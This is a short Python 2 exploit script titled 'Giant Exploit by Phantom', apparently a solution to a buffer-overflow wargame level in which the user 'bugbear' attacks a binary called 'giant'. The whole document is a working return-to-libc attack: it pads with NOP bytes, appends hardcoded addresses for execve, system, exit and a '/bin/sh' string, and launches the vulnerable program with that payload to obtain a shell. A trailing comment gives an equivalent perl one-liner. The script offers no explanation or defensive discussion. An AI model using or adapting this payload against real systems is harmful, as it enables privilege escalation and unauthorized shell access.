import os, sys

print "Giant Exploit by Phantom"
print "[+] Making Exploit......"

victim = "/home/bugbear/giant"
NOP = "\x90"*44
execve = "\x48\x9d\x0a\x40"
system = "\xe0\x8a\x05\x40"
exit = "\xe0\x91\x03\x40"
binsh = "\xf9\xbf\x0f\x40"

payload = NOP + execve + system + exit + binsh

print "[+] Victim : " + victim
print "[+] Exploiting Giant RTL2 vuln.."
print "[+] Loading payload..."
print "[+] Shellcode length : ", len(payload)
print

os.execv(victim, ("", payload))
#./bugbear $(perl -e 'print "\xbf"x44, "\xe0\x8a\x05\x40", "cccc", "\xf9\xbf\x0f\x40"')